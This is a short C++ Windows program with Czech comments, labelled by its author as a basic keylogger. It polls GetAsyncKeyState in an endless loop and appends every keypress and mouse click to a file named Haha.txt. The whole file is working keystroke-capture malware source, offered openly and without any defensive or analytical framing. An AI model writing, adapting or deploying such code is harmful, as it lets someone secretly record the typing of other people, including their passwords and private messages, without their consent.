/*
##Author: Freaky#0420##
##Date: 02/11/202##
##Project: Uplně basic keylogger##
*/

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

int main()
{
   char c;
   for(;;)
   {
       for( c=8; c<=222; c++)
       {
           if(GetAsyncKeyState(c) == -32767) //GetAsyncKeyState je funkce která zjišťuje jestli bylo písmeno, číslo zmáčknuté na klávesnici a kliknutí na myši, nechápu jak se to přesně používá proto to píše [] :/
           {
               ofstream write("Haha.txt", ios::app); // Do složky ve které byl vytvořený tenhle projekt se vytvoří textový dokument zvaný: Haha.txt
               write << c; // Všechno co uživatel zmáčkne na klávesnici nebo klikne na myši tak se vypíše do Haha.txt
           }
       }
   }
return 0;
}
